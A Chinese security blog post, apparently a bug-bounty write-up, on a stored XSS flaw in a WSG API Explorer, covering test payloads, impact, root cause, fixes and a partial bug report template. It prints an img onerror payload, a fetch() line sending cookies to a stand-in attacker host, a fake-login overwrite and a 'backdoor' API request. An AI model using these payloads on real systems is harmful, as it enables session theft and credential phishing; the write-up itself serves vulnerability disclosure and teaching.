---
title: "我在 API Explorer 中发现了一个存储型 XSS 漏洞——以下是我的具体操作步骤"
url: "https://mp.weixin.qq.com/s/gQpvJE8_--8CLXOOzTdSHw"
source: "安全狗的自我修养"
date: 2026-04-28
fetched: 2026-05-05
language: zh
read: false
archived: false
tags: []
---

> [!example] AI 摘要
> 本文披露了一个存在于 Web 服务网关（WSG）API 测试界面（WsgExplorer.aspx）中的存储型 XSS 漏洞。攻击者可通过在“Repositories”节点中提交恶意 HTML/JavaScript 负载（如 `<img onerror=alert()>`），使脚本被后端存储并在所有用户访问该页面时自动执行。该漏洞源于服务端未过滤用户输入、前端又直接使用 `innerHTML` 渲染导致，危害包括会话劫持、凭证窃取及内网 API 滥用。作者强调：开发者工具常被忽视但风险极高，存储型 XSS 比反射型更危险，且“部分过滤”不等于安全。

---

<h1 class="js_darkmode__0">
 <span>
  <span style="color: rgb(255, 0, 0);">
   官网：
  </span>
 </span>
 <span>
  <span style="color: rgb(255, 0, 0);">
   http://securitytech.cc
  </span>
 </span>
</h1>
<p>
 <span>
  <br />
 </span>
</p>
<p>
 <span>
  有时候，最有价值的漏洞就藏在开发者用来测试自己 API 的工具中。
 </span>
</p>
<hr />
<h2>
 <span>
 </span>
</h2>
<p>
 <span>
  每个漏洞猎人都经历过这种时刻。
 </span>
</p>
<p>
 <span>
  你盯着主应用看了好几个小时：登录表单、搜索框、用户资料字段 —— 全都经过加固、过滤。
 </span>
</p>
<p>
 <span>
  你准备收工了。
 </span>
</p>
<p>
 <span>
  然后你进入了应用的一个角落 —— 感觉不太一样。
 </span>
</p>
<p>
 <span>
  不够精致，更像是内部工具，却被悄悄暴露到了公网。
 </span>
</p>
<p>
 <span>
  我就是在这种地方发现了这个漏洞。
 </span>
</p>
<p>
 <span>
  目标是一个
 </span>
 <strong style="font-weight: bold; color: rgb(0, 0, 0); margin-top: 0px;">
  <span>
   WSG（Web Services Gateway）Explorer
  </span>
 </strong>
 <span>
  —— 本质上是一个内置的 API 测试界面，位于：
 </span>
</p>
<pre><ol class="list-paddingleft-1" style="margin: 0px; padding: 10px 0px 10px 30px; color: transparent;"><li style="margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px 0px 0px 1em; background-color: rgb(45, 45, 45); margin-top: 6px !important;"><span style="color: rgb(74, 74, 74); margin-top: 0px; display: block; line-height: 22px; font-size: 14px !important;"><span style="color: rgb(74, 74, 74); margin-top: 0px; line-height: 22px; display: block; font-size: 14px !important;"><code><span><span>WsgExplorer</span></span><span><span>.</span></span><span><span>aspx</span></span></code></span></span></li></ol></pre>
<p>
 <span>
  可以把它理解为类似 Swagger UI 或浏览器版 Postman。
 </span>
</p>
<p>
 <span>
  它包含：
 </span>
</p>
<ul class="list-paddingleft-1">
 <li style="margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px; margin-top: 6px !important;">
  <span style="color: rgb(74, 74, 74); margin-top: 0px; line-height: 22px; font-size: 14px !important;">
   <span style="color: rgb(74, 74, 74); margin-top: 0px; line-height: 22px; font-size: 14px !important;">
    <span>
     导航树
    </span>
   </span>
  </span>
 </li>
 <li style="margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px; margin-top: 6px !important;">
  <span style="color: rgb(74, 74, 74); margin-top: 0px; line-height: 22px; font-size: 14px !important;">
   <span style="color: rgb(74, 74, 74); margin-top: 0px; line-height: 22px; font-size: 14px !important;">
    <span>
     查询构建器
    </span>
   </span>
  </span>
 </li>
 <li style="margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px; margin-top: 6px !important;">
  <span style="color: rgb(74, 74, 74); margin-top: 0px; line-height: 22px; font-size: 14px !important;">
   <span style="color: rgb(74, 74, 74); margin-top: 0px; line-height: 22px; font-size: 14px !important;">
    <span>
     创建和修改数据的功能
    </span>
   </span>
  </span>
 </li>
</ul>
<p>
 <span>
  开发者使用它来直接测试 API 接口。
 </span>
</p>
<p>
 <span>
  它显然不是核心功能，也正因为如此，没有人认真检查它。
 </span>
</p>
<hr />
<h2>
 <span>
  First Look at the Interface
 </span>
</h2>
<p>
 <span>
  该 Explorer 在导航树中暴露了多个 API 资源分类：
 </span>
</p>
<pre><ol class="list-paddingleft-1" style="margin: 0px; padding: 10px 0px 10px 30px; color: transparent;"><li style="margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px 0px 0px 1em; background-color: rgb(45, 45, 45); margin-top: 6px !important;"><span style="color: rgb(74, 74, 74); margin-top: 0px; display: block; line-height: 22px; font-size: 14px !important;"><span style="color: rgb(74, 74, 74); margin-top: 0px; line-height: 22px; display: block; font-size: 14px !important;"><code><span><span>ConnectionFormats</span></span></code></span></span></li><li style="margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px 0px 0px 1em; background: rgb(45, 45, 45); margin-top: 6px !important;"><span style="color: rgb(74, 74, 74); margin-top: 0px; display: block; line-height: 22px; font-size: 14px !important;"><span style="color: rgb(74, 74, 74); margin-top: 0px; line-height: 22px; display: block; font-size: 14px !important;"><code><span><span>MetaSchema</span></span></code></span></span></li><li style="margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px 0px 0px 1em; background-color: rgb(45, 45, 45); margin-top: 6px !important;"><span style="color: rgb(74, 74, 74); margin-top: 0px; display: block; line-height: 22px; font-size: 14px !important;"><span style="color: rgb(74, 74, 74); margin-top: 0px; line-height: 22px; display: block; font-size: 14px !important;"><code><span><span>Plugins</span></span></code></span></span></li><li style="margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px 0px 0px 1em; background: rgb(45, 45, 45); margin-top: 6px !important;"><span style="color: rgb(74, 74, 74); margin-top: 0px; display: block; line-height: 22px; font-size: 14px !important;"><span style="color: rgb(74, 74, 74); margin-top: 0px; line-height: 22px; display: block; font-size: 14px !important;"><code><span><span>Policies</span></span></code></span></span></li><li style="margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px 0px 0px 1em; background-color: rgb(45, 45, 45); margin-top: 6px !important;"><span style="color: rgb(74, 74, 74); margin-top: 0px; display: block; line-height: 22px; font-size: 14px !important;"><span style="color: rgb(74, 74, 74); margin-top: 0px; line-height: 22px; display: block; font-size: 14px !important;"><code><span><span>Repositories</span></span><span><span>←</span></span><span><span>这里引起了注意</span></span></code></span></span></li><li style="margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px 0px 0px 1em; background: rgb(45, 45, 45); margin-top: 6px !important;"><span style="color: rgb(74, 74, 74); margin-top: 0px; display: block; line-height: 22px; font-size: 14px !important;"><span style="color: rgb(74, 74, 74); margin-top: 0px; line-height: 22px; display: block; font-size: 14px !important;"><code><span><span>ServiceVersions</span></span></code></span></span></li></ol></pre>
<p>
 <span>
  <img src="https://mmbiz.qpic.cn/sz_mmbiz_png/R98u9GTbBntoibMmN8Xib9j3J5LFeCI2X7j0Kzwr8ernsdmzDGFnj3RqQhR4bDpHUiaqEv7kKAV3I0plO8r44AYI3JnBib3I2TtRUjpeczAuUicI/640?wx_fmt=png&amp;from=appmsg&amp;watermark=1&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1#imgIndex=0" style="height: auto !important; width: 680px !important;" />
 </span>
</p>
<p>
 <span>
  该界面允许用户：
 </span>
</p>
<ul class="list-paddingleft-1">
 <li style="margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px; margin-top: 6px !important;">
  <span style="color: rgb(74, 74, 74); margin-top: 0px; line-height: 22px; font-size: 14px !important;">
   <span style="color: rgb(74, 74, 74); margin-top: 0px; line-height: 22px; font-size: 14px !important;">
    <span>
     查询资源
    </span>
   </span>
  </span>
 </li>
 <li style="margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px; margin-top: 6px !important;">
  <span style="color: rgb(74, 74, 74); margin-top: 0px; line-height: 22px; font-size: 14px !important;">
   <span style="color: rgb(74, 74, 74); margin-top: 0px; line-height: 22px; font-size: 14px !important;">
    <span>
     生成测试集合
    </span>
   </span>
  </span>
 </li>
 <li style="margin-top: 6px !important; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px;">
  <span style="font-size: 14px !important; color: rgb(74, 74, 74); margin-top: 0px; line-height: 22px;">
   <span style="font-size: 14px !important; color: rgb(74, 74, 74); margin-top: 0px; line-height: 22px;">
    <span>
     修改 / 上传数据
    </span>
   </span>
  </span>
 </li>
</ul>
<p>
 <span>
  这类功能几乎总是涉及用户输入，并且会在某处回显。
 </span>
</p>
<p>
 <span>
  只要存在回显，就存在 XSS 的可能。
 </span>
</p>
<hr />
<h2>
 <span>
  Finding the Injection Point
 </span>
</h2>
<p>
 <span>
  我从
 </span>
 <strong style="font-weight: bold; color: rgb(0, 0, 0); margin-top: 0px;">
  <span>
   Repositories
  </span>
 </strong>
 <span>
  节点开始测试，因为它允许用户自定义名称和元数据。
 </span>
</p>
<p>
 <span>
  问题是：应用是否对输入进行了过滤？
 </span>
</p>
<hr />
<h3>
 <span>
  Step 1 — 测试普通输入
 </span>
</h3>
<pre><ol class="list-paddingleft-1" style="margin: 0px; padding: 10px 0px 10px 30px; color: transparent;"><li style="margin-top: 6px !important; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px 0px 0px 1em; background-color: rgb(45, 45, 45);"><span style="font-size: 14px !important; color: rgb(74, 74, 74); margin-top: 0px; display: block; line-height: 22px;"><span style="font-size: 14px !important; color: rgb(74, 74, 74); margin-top: 0px; line-height: 22px; display: block;"><code><span><span>test_sadanand_123</span></span></code></span></span></li></ol></pre>
<p>
 <span>
  提交后刷新导航树，可以看到内容被回显。
 </span>
</p>
<p>
 <span>
  说明输入被存储并渲染到了 DOM 中。
 </span>
</p>
<hr />
<h3>
 <span>
  Step 2 — 测试 HTML 注入
 </span>
</h3>
<pre><ol class="list-paddingleft-1" style="margin: 0px; padding: 10px 0px 10px 30px; color: transparent;"><li style="margin-top: 6px !important; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px 0px 0px 1em; background-color: rgb(45, 45, 45);"><span style="font-size: 14px !important; color: rgb(74, 74, 74); margin-top: 0px; display: block; line-height: 22px;"><span style="font-size: 14px !important; color: rgb(74, 74, 74); margin-top: 0px; line-height: 22px; display: block;"><code><span><span>&lt;b&gt;</span></span><span><span>test</span></span><span><span>&lt;/b&gt;</span></span></code></span></span></li></ol></pre>
<p>
 <span>
  结果显示为加粗文本。
 </span>
</p>
<p>
 <span>
  没有进行编码。
 </span>
</p>
<p>
 <span>
  应用直接将 HTML 注入到了页面中。
 </span>
</p>
<p>
 <span>
  浏览器将输入当作 HTML 解析，而不是纯文本。
 </span>
</p>
<hr />
<h3>
 <span>
  Step 3 — 测试脚本执行
 </span>
</h3>
<pre><ol class="list-paddingleft-1" style="margin: 0px; padding: 10px 0px 10px 30px; color: transparent;"><li style="margin-top: 6px !important; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px 0px 0px 1em; background-color: rgb(45, 45, 45);"><span style="font-size: 14px !important; color: rgb(74, 74, 74); margin-top: 0px; display: block; line-height: 22px;"><span style="font-size: 14px !important; color: rgb(74, 74, 74); margin-top: 0px; line-height: 22px; display: block;"><code><span><span>&lt;img</span></span><span><span>src</span></span><span><span>=</span></span><span><span>x</span></span><span><span>onerror</span></span><span><span>=</span></span><span><span>"</span></span><span><span>alert</span></span><span><span>(</span></span><span><span>'Hacked by Sadanand'</span></span><span><span>)</span></span><span><span>"</span></span><span><span>&gt;</span></span></code></span></span></li></ol></pre>
<p>
 <span>
  提交 payload 后返回导航树。
 </span>
</p>
<p>
 <span>
  浏览器立即弹出 alert。
 </span>
</p>
<hr />
<h2>
 <span>
  Proof of Concept
 </span>
</h2>
<p>
 <span>
  <img src="https://mmbiz.qpic.cn/mmbiz_png/R98u9GTbBns5qr7HKMObRAVkSG8j0f9W7NWVnwQ7BjSiaBiarMeQUdibXBtA6eUG9NcNHhibqdr6ceX6PNAUMT06VIiaAOW2UZgVMdPCxX2Y5pqs/640?wx_fmt=png&amp;from=appmsg&amp;watermark=1&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1#imgIndex=1" style="height: auto !important; width: 680px !important;" />
 </span>
</p>
<p>
 <span>
  alert 在应用域中执行。
 </span>
</p>
<p>
 <span>
  payload 被存储在后端，每次加载该节点时都会执行。
 </span>
</p>
<p>
 <span>
  这是一个
 </span>
 <strong style="font-weight: bold; color: rgb(0, 0, 0); margin-top: 0px;">
  <span>
   存储型 XSS（Stored XSS）
  </span>
 </strong>
 <span>
  。
 </span>
</p>
<hr />
<p>
 <span>
  页面源码中也可以看到 payload 被直接嵌入 DOM：
 </span>
</p>
<pre><ol class="list-paddingleft-1" style="margin: 0px; padding: 10px 0px 10px 30px; color: transparent;"><li style="margin-top: 6px !important; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px 0px 0px 1em; background-color: rgb(45, 45, 45);"><span style="font-size: 14px !important; color: rgb(74, 74, 74); margin-top: 0px; display: block; line-height: 22px;"><span style="font-size: 14px !important; color: rgb(74, 74, 74); margin-top: 0px; line-height: 22px; display: block;"><code><span><span>id</span></span><span><span>=</span></span><span><span>"_3c_img_20_src_3d__22_x_22__20_onerror_3d__22_alert_28__27_Hacked_20_by_20_Sadanand_27_..."</span></span></code></span></span></li></ol></pre>
<p>
 <span>
  应用尝试对 id 属性进行编码，但没有对实际 HTML 内容进行编码。
 </span>
</p>
<p>
 <span>
  这是典型的“部分过滤”错误。
 </span>
</p>
<hr />
<h2>
 <span>
  Why Stored XSS Is Worse Than Reflected
 </span>
</h2>
<p>
 <span>
  很多初学者把所有 XSS 当成一样的，这是错误的。
 </span>
</p>
<table>
 <thead>
  <tr style="margin-top: 0px;">
   <th style="margin: 0px; font-style: normal; font-weight: bold; text-align: left; border: 1px solid rgb(233, 235, 236);">
    <section>
     <span>
      类型
     </span>
    </section>
   </th>
   <th style="margin: 0px; font-style: normal; font-weight: bold; text-align: left; border: 1px solid rgb(233, 235, 236);">
    <section>
     <span>
      是否持久
     </span>
    </section>
   </th>
   <th style="margin: 0px; font-style: normal; font-weight: bold; text-align: left; border: 1px solid rgb(233, 235, 236);">
    <section>
     <span>
      是否需要点击
     </span>
    </section>
   </th>
   <th style="margin: 0px; font-style: normal; font-weight: bold; text-align: left; border: 1px solid rgb(233, 235, 236);">
    <section>
     <span>
      影响
     </span>
    </section>
   </th>
  </tr>
 </thead>
 <tbody>
  <tr style="margin-top: 0px;">
   <td style="margin: 0px; border: 1px solid rgb(233, 235, 236);">
    <section>
     <span>
      反射型 XSS
     </span>
    </section>
   </td>
   <td style="margin: 0px; border: 1px solid rgb(233, 235, 236);">
    <section>
     <span>
      否
     </span>
    </section>
   </td>
   <td style="margin: 0px; border: 1px solid rgb(233, 235, 236);">
    <section>
     <span>
      是
     </span>
    </section>
   </td>
   <td style="margin: 0px; border: 1px solid rgb(233, 235, 236);">
    <section>
     <span>
      中
     </span>
    </section>
   </td>
  </tr>
  <tr style="background-color: rgb(248, 248, 248);">
   <td style="margin: 0px; border: 1px solid rgb(233, 235, 236);">
    <section>
     <span>
      DOM XSS
     </span>
    </section>
   </td>
   <td style="margin: 0px; border: 1px solid rgb(233, 235, 236);">
    <section>
     <span>
      否
     </span>
    </section>
   </td>
   <td style="margin: 0px; border: 1px solid rgb(233, 235, 236);">
    <section>
     <span>
      是
     </span>
    </section>
   </td>
   <td style="margin: 0px; border: 1px solid rgb(233, 235, 236);">
    <section>
     <span>
      中
     </span>
    </section>
   </td>
  </tr>
  <tr>
   <td style="margin: 0px; border: 1px solid rgb(233, 235, 236);">
    <section>
     <span>
      存储型 XSS
     </span>
    </section>
   </td>
   <td style="margin: 0px; border: 1px solid rgb(233, 235, 236);">
    <section>
     <span>
      是
     </span>
    </section>
   </td>
   <td style="margin: 0px; border: 1px solid rgb(233, 235, 236);">
    <section>
     <span>
      否
     </span>
    </section>
   </td>
   <td style="margin: 0px; border: 1px solid rgb(233, 235, 236);">
    <section>
     <span>
      高 / 严重
     </span>
    </section>
   </td>
  </tr>
 </tbody>
</table>
<p>
 <span>
  存储型 XSS 的特点：
 </span>
</p>
<ul class="list-paddingleft-1">
 <li style="margin-top: 6px !important; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px;">
  <span style="font-size: 14px !important; color: rgb(74, 74, 74); margin-top: 0px; line-height: 22px;">
   <span style="font-size: 14px !important; color: rgb(74, 74, 74); margin-top: 0px; line-height: 22px;">
    <span>
     payload 存储在数据库中
    </span>
   </span>
  </span>
 </li>
 <li style="margin-top: 6px !important; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px;">
  <span style="font-size: 14px !important; color: rgb(74, 74, 74); margin-top: 0px; line-height: 22px;">
   <span style="font-size: 14px !important; color: rgb(74, 74, 74); margin-top: 0px; line-height: 22px;">
    <span>
     每个访问页面的用户都会触发
    </span>
   </span>
  </span>
 </li>
 <li style="margin-top: 6px !important; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px;">
  <span style="font-size: 14px !important; color: rgb(74, 74, 74); margin-top: 0px; line-height: 22px;">
   <span style="font-size: 14px !important; color: rgb(74, 74, 74); margin-top: 0px; line-height: 22px;">
    <span>
     不需要诱导点击
    </span>
   </span>
  </span>
 </li>
</ul>
<hr />
<p>
 <span>
  在这个 API Explorer 中，受害者通常是：
 </span>
</p>
<ul class="list-paddingleft-1">
 <li style="margin-top: 6px !important; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px;">
  <span style="font-size: 14px !important; color: rgb(74, 74, 74); margin-top: 0px; line-height: 22px;">
   <span style="font-size: 14px !important; color: rgb(74, 74, 74); margin-top: 0px; line-height: 22px;">
    <span>
     开发者
    </span>
   </span>
  </span>
 </li>
 <li style="margin-top: 6px !important; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px;">
  <span style="font-size: 14px !important; color: rgb(74, 74, 74); margin-top: 0px; line-height: 22px;">
   <span style="font-size: 14px !important; color: rgb(74, 74, 74); margin-top: 0px; line-height: 22px;">
    <span>
     管理员
    </span>
   </span>
  </span>
 </li>
 <li style="margin-top: 6px !important; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px;">
  <span style="font-size: 14px !important; color: rgb(74, 74, 74); margin-top: 0px; line-height: 22px;">
   <span style="font-size: 14px !important; color: rgb(74, 74, 74); margin-top: 0px; line-height: 22px;">
    <span>
     支持人员
    </span>
   </span>
  </span>
 </li>
</ul>
<p>
 <span>
  这些都是高权限用户。
 </span>
</p>
<hr />
<h2>
 <span>
  What an Attacker Could Do With This
 </span>
</h2>
<p>
 <span>
  真实攻击者不会停留在 alert。
 </span>
</p>
<hr />
<h3>
 <span>
  1. 窃取 Session
 </span>
</h3>
<pre><ol class="list-paddingleft-1" style="margin: 0px; padding: 10px 0px 10px 30px; color: transparent;"><li style="margin-top: 6px !important; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px 0px 0px 1em; background-color: rgb(45, 45, 45);"><span style="font-size: 14px !important; color: rgb(74, 74, 74); margin-top: 0px; display: block; line-height: 22px;"><span style="font-size: 14px !important; color: rgb(74, 74, 74); margin-top: 0px; line-height: 22px; display: block;"><code><span><span>fetch</span></span><span><span>(</span></span><span><span>'https://attacker.com/steal?c='</span></span><span><span>+</span></span><span><span> document</span></span><span><span>.</span></span><span><span>cookie</span></span><span><span>)</span></span></code></span></span></li></ol></pre>
<p>
 <span>
  如果 Cookie 没有 HttpOnly，攻击者可以获取会话。
 </span>
</p>
<hr />
<h3>
 <span>
  2. 窃取凭证
 </span>
</h3>
<pre><ol class="list-paddingleft-1" style="margin: 0px; padding: 10px 0px 10px 30px; color: transparent;"><li style="margin-top: 6px !important; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px 0px 0px 1em; background-color: rgb(45, 45, 45);"><span style="font-size: 14px !important; color: rgb(74, 74, 74); margin-top: 0px; display: block; line-height: 22px;"><span style="font-size: 14px !important; color: rgb(74, 74, 74); margin-top: 0px; line-height: 22px; display: block;"><code><span><span>document</span></span><span><span>.</span></span><span><span>body</span></span><span><span>.</span></span><span><span>innerHTML </span></span><span><span>=</span></span><span><span>'&lt;div&gt;伪造登录界面...&lt;/div&gt;'</span></span></code></span></span></li></ol></pre>
<p>
 <span>
  注入一个假的登录界面，诱导用户输入账号密码。
 </span>
</p>
<hr />
<h3>
 <span>
  3. 滥用内部 API
 </span>
</h3>
<pre><ol class="list-paddingleft-1" style="margin: 0px; padding: 10px 0px 10px 30px; color: transparent;"><li style="margin-top: 6px !important; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px 0px 0px 1em; background-color: rgb(45, 45, 45);"><span style="font-size: 14px !important; color: rgb(74, 74, 74); margin-top: 0px; display: block; line-height: 22px;"><span style="font-size: 14px !important; color: rgb(74, 74, 74); margin-top: 0px; line-height: 22px; display: block;"><code><span><span>fetch</span></span><span><span>(</span></span><span><span>'/wsg/v2.8/Repositories'</span></span><span><span>,</span></span><span><span>{</span></span></code></span></span></li><li style="margin-top: 6px !important; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px 0px 0px 1em; background: rgb(45, 45, 45);"><span style="font-size: 14px !important; color: rgb(74, 74, 74); margin-top: 0px; display: block; line-height: 22px;"><span style="font-size: 14px !important; color: rgb(74, 74, 74); margin-top: 0px; line-height: 22px; display: block;"><code><span><span>  method</span></span><span><span>:</span></span><span><span>'POST'</span></span><span><span>,</span></span></code></span></span></li><li style="margin-top: 6px !important; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px 0px 0px 1em; background-color: rgb(45, 45, 45);"><span style="font-size: 14px !important; color: rgb(74, 74, 74); margin-top: 0px; display: block; line-height: 22px;"><span style="font-size: 14px !important; color: rgb(74, 74, 74); margin-top: 0px; line-height: 22px; display: block;"><code><span><span>  headers</span></span><span><span>:</span></span><span><span>{</span></span><span><span>'Content-Type'</span></span><span><span>:</span></span><span><span>'application/json'</span></span><span><span>},</span></span></code></span></span></li><li style="margin-top: 6px !important; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px 0px 0px 1em; background: rgb(45, 45, 45);"><span style="font-size: 14px !important; color: rgb(74, 74, 74); margin-top: 0px; display: block; line-height: 22px;"><span style="font-size: 14px !important; color: rgb(74, 74, 74); margin-top: 0px; line-height: 22px; display: block;"><code><span><span>  body</span></span><span><span>:</span></span><span><span> JSON</span></span><span><span>.</span></span><span><span>stringify</span></span><span><span>({</span></span><span><span>name</span></span><span><span>:</span></span><span><span>'backdoor'</span></span><span><span>,</span></span><span><span> config</span></span><span><span>:</span></span><span><span>'...'</span></span><span><span>})</span></span></code></span></span></li><li style="margin-top: 6px !important; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px 0px 0px 1em; background-color: rgb(45, 45, 45);"><span style="font-size: 14px !important; color: rgb(74, 74, 74); margin-top: 0px; display: block; line-height: 22px;"><span style="font-size: 14px !important; color: rgb(74, 74, 74); margin-top: 0px; line-height: 22px; display: block;"><code><span><span>})</span></span></code></span></span></li></ol></pre>
<p>
 <span>
  利用当前用户权限执行 API 请求。
 </span>
</p>
<hr />
<h3>
 <span>
  4. 蠕虫式传播
 </span>
</h3>
<p>
 <span>
  如果注入的节点对所有用户可见：
 </span>
</p>
<p>
 <span>
  每个用户访问都会触发 XSS，从而扩大影响。
 </span>
</p>
<hr />
<h2>
 <span>
  The Root Cause
 </span>
</h2>
<p>
 <span>
  漏洞产生的原因是两个错误同时存在：
 </span>
</p>
<hr />
<h3>
 <span>
  1. 存储未过滤输入
 </span>
</h3>
<p>
 <span>
  用户输入被直接存入后端，没有处理：
 </span>
</p>
<ul class="list-paddingleft-1">
 <li style="margin-top: 6px !important; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px;">
  <span style="font-size: 14px !important; color: rgb(74, 74, 74); margin-top: 0px; line-height: 22px;">
   <span style="font-size: 14px !important; color: rgb(74, 74, 74); margin-top: 0px; line-height: 22px;">
    <code>
     <span>
      <span>
       &lt;
      </span>
     </span>
    </code>
   </span>
  </span>
 </li>
 <li style="margin-top: 6px !important; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px;">
  <span style="font-size: 14px !important; color: rgb(74, 74, 74); margin-top: 0px; line-height: 22px;">
   <span style="font-size: 14px !important; color: rgb(74, 74, 74); margin-top: 0px; line-height: 22px;">
    <code>
     <span>
      <span>
       &gt;
      </span>
     </span>
    </code>
   </span>
  </span>
 </li>
 <li style="margin-top: 6px !important; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px;">
  <span style="font-size: 14px !important; color: rgb(74, 74, 74); margin-top: 0px; line-height: 22px;">
   <span style="font-size: 14px !important; color: rgb(74, 74, 74); margin-top: 0px; line-height: 22px;">
    <code>
     <span>
      <span>
       "
      </span>
     </span>
    </code>
   </span>
  </span>
 </li>
</ul>
<hr />
<h3>
 <span>
  2. 渲染时直接使用 HTML
 </span>
</h3>
<p>
 <span>
  前端使用类似：
 </span>
</p>
<pre><ol class="list-paddingleft-1" style="margin: 0px; padding: 10px 0px 10px 30px; color: transparent;"><li style="margin-top: 6px !important; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px 0px 0px 1em; background-color: rgb(45, 45, 45);"><span style="font-size: 14px !important; color: rgb(74, 74, 74); margin-top: 0px; display: block; line-height: 22px;"><span style="font-size: 14px !important; color: rgb(74, 74, 74); margin-top: 0px; line-height: 22px; display: block;"><code><span><span>innerHTML</span></span></code></span></span></li></ol></pre>
<p>
 <span>
  而不是：
 </span>
</p>
<pre><ol class="list-paddingleft-1" style="margin: 0px; padding: 10px 0px 10px 30px; color: transparent;"><li style="margin-top: 6px !important; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px 0px 0px 1em; background-color: rgb(45, 45, 45);"><span style="font-size: 14px !important; color: rgb(74, 74, 74); margin-top: 0px; display: block; line-height: 22px;"><span style="font-size: 14px !important; color: rgb(74, 74, 74); margin-top: 0px; line-height: 22px; display: block;"><code><span><span>textContent</span></span></code></span></span></li></ol></pre>
<hr />
<h2>
 <span>
  修复方式
 </span>
</h2>
<p>
 <span>
  必须同时修复：
 </span>
</p>
<h3>
 <span>
  服务端
 </span>
</h3>
<ul class="list-paddingleft-1">
 <li style="margin-top: 6px !important; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px;">
  <span style="font-size: 14px !important; color: rgb(74, 74, 74); margin-top: 0px; line-height: 22px;">
   <span style="font-size: 14px !important; color: rgb(74, 74, 74); margin-top: 0px; line-height: 22px;">
    <span>
     过滤或拒绝 HTML 输入
    </span>
   </span>
  </span>
 </li>
</ul>
<h3>
 <span>
  客户端
 </span>
</h3>
<ul class="list-paddingleft-1">
 <li style="margin-top: 6px !important; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px;">
  <span style="font-size: 14px !important; color: rgb(74, 74, 74); margin-top: 0px; line-height: 22px;">
   <span style="font-size: 14px !important; color: rgb(74, 74, 74); margin-top: 0px; line-height: 22px;">
    <span>
     使用 textContent
    </span>
   </span>
  </span>
 </li>
 <li style="margin-top: 6px !important; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px;">
  <span style="font-size: 14px !important; color: rgb(74, 74, 74); margin-top: 0px; line-height: 22px;">
   <span style="font-size: 14px !important; color: rgb(74, 74, 74); margin-top: 0px; line-height: 22px;">
    <span>
     或对输出进行编码
    </span>
   </span>
  </span>
 </li>
</ul>
<p>
 <span>
  只修一端是不够的。
 </span>
</p>
<hr />
<h2>
 <span>
  Bug Report 模板
 </span>
</h2>
<p>
 <strong style="font-weight: bold; color: rgb(0, 0, 0); margin-top: 0px;">
  <span>
   Title
  </span>
 </strong>
</p>
<pre><ol class="list-paddingleft-1" style="margin: 0px; padding: 10px 0px 10px 30px; color: transparent;"><li style="margin-top: 6px !important; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px 0px 0px 1em; background-color: rgb(45, 45, 45);"><span style="font-size: 14px !important; color: rgb(74, 74, 74); margin-top: 0px; display: block; line-height: 22px;"><span style="font-size: 14px !important; color: rgb(74, 74, 74); margin-top: 0px; line-height: 22px; display: block;"><code><span><span>Stored</span></span><span><span> XSS </span></span><span><span>in</span></span><span><span>WsgExplorer</span></span><span><span>Navigation</span></span><span><span>Tree</span></span><span><span> via </span></span><span><span>Unsanitized</span></span><span><span>Repository</span></span><span><span>Names</span></span></code></span></span></li></ol></pre>
<p>
 <strong style="font-weight: bold; color: rgb(0, 0, 0); margin-top: 0px;">
  <span>
   Severity
  </span>
 </strong>
</p>
<pre><ol class="list-paddingleft-1" style="margin: 0px; padding: 10px 0px 10px 30px; color: transparent;"><li style="margin-top: 6px !important; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px 0px 0px 1em; background-color: rgb(45, 45, 45);"><span style="font-size: 14px !important; color: rgb(74, 74, 74); margin-top: 0px; display: block; line-height: 22px;"><span style="font-size: 14px !important; color: rgb(74, 74, 74); margin-top: 0px; line-height: 22px; display: block;"><code><span><span>High</span></span></code></span></span></li></ol></pre>
<p>
 <strong style="font-weight: bold; color: rgb(0, 0, 0); margin-top: 0px;">
  <span>
   Affected Endpoint
  </span>
 </strong>
</p>
